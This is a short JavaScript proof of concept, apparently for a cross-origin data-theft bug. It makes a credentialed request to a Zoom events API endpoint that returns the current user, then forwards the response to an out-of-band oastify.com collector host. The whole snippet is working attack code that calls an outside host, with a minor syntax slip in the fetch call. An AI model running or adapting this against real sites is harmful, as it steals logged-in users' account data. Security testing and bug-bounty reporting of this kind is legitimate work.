var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    fetch('https://s92luzs7awz2niagondy9mc1csij6du2.oastify.com/?xxx='+this.responseText;)
    .then(res => res.json())
    .then(data => console.log(data))
};
